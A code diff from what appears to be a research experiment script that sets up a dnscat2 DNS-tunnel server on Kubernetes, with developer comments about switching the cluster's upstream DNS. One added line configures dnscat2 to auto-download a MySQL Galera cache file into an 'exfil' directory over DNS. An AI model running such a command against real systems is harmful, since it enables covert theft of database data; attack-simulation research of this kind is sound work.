@@ -1049,7 +1049,20 @@ def setup_dnscat_server():
     ## TODO: definitely NOT going to be doing this manually...
     # Step (1): install dnscat_server dependencies + start it (already have a script ready to go)
     #### note: ensure dnscat's upstream is what would normally by the upstream
-    ### NO ^^^ do not install stuff in this file!!!!!
+    ### NO ^^^ do not install stuff in this file!!!!! <--- installing is for run_exp_on_cloudlab
+    dnscat_start_server = "ruby ./dnscat2/server/dnscat2.rb cheddar.org; set passthrough=8.8.8.8:53; set auto_command=download " \
+                          "/var/lib/mysql/galera.cache ./exfil; delay 5; window -i dns1"
+    ## wait?? is this the correct place to do this??? ^^^
+    ## this is too janky I think for run_experiment...
+    ## if possible, I'd want to switch this at another point in time (like during setup)
+    # why? why do it in setup??? this seems like a reasonable place to do it
+    # though I agree that we need to extract the existing config map before switching
+
+    ## step (2) : switch the upstream dns server.
+
+    ### TODO: okay, here is the plan. Keep it here. Try switching the DNS
+    ### Server and see if installing stuff still works. If it does, we are
+    ### fine. Otherwise we have a whole LOT of work to do after that...
 
     # Step (2): switch upstream DNS server of kubernetes deployment (to the dnscat server...)
     # Step (3): [LATER] switch it back @ and of experiment
